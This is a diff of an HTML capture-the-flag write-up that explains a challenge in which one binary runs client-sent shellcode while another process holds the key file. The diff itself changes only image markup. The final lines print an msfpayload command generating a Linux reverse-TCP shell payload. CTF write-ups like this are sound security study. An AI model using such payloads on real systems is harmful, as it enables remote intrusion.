@@ -5,12 +5,12 @@
 &lt;div class="section" id="the-wrapper-maw"&gt;
 &lt;h2&gt;The wrapper - &lt;tt class="docutils literal"&gt;maw&lt;/tt&gt;&lt;/h2&gt;
 &lt;p&gt;The main service binary is called &lt;tt class="docutils literal"&gt;maw&lt;/tt&gt; and does the usual listen-socket wrapping as shown in the screenshot below. However it also opens the key file and for handling the accepted client actually executes another binary called &lt;tt class="docutils literal"&gt;sis&lt;/tt&gt; and tells it about the client socket fd and the open fd to the key file.&lt;/p&gt;
-&lt;img alt="pictures/maw.png" src="pictures/maw.png" /&gt;
+&lt;a class="reference external image-reference" href="pictures/maw.png"&gt;&lt;img alt="maw disassembly" class="align-center" src="pictures/maw.png" style="width: 400px; height: 300px;" /&gt;&lt;/a&gt;
 &lt;/div&gt;
 &lt;div class="section" id="the-handler-sis"&gt;
 &lt;h2&gt;The handler - &lt;tt class="docutils literal"&gt;sis&lt;/tt&gt;&lt;/h2&gt;
 &lt;p&gt;The &lt;tt class="docutils literal"&gt;sis&lt;/tt&gt; binary is small and simple - it basically takes the fds from its arguments, then forks and the parent will read in the keyfile content and wait for a bit (15 seconds) and the child will read from the socket and jump into the received data - thus basically executing our sent shellcode.&lt;/p&gt;
-&lt;a class="reference external image-reference" href="pictures/sis.png"&gt;&lt;img alt="sis disassembly" src="pictures/sis.png" style="width: 200px; height: 100px;" /&gt;&lt;/a&gt;
+&lt;a class="reference external image-reference" href="pictures/sis.png"&gt;&lt;img alt="sis disassembly" class="align-center" src="pictures/sis.png" style="width: 400px; height: 300px;" /&gt;&lt;/a&gt;
 &lt;p&gt;Thus the twist is that even with our shellcode running we can not see the key in memory, as it is only available in the other process. We thought that spawning a shell and attaching to that other process with a debugger would get the job done.&lt;/p&gt;
 &lt;p&gt;Alright, generate shellcode, send it over.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;msfpayload linux/x64/shell_reverse_tcp LHOST=?.?.?.? LPORT=4445 R &amp;gt; shellcode.bin
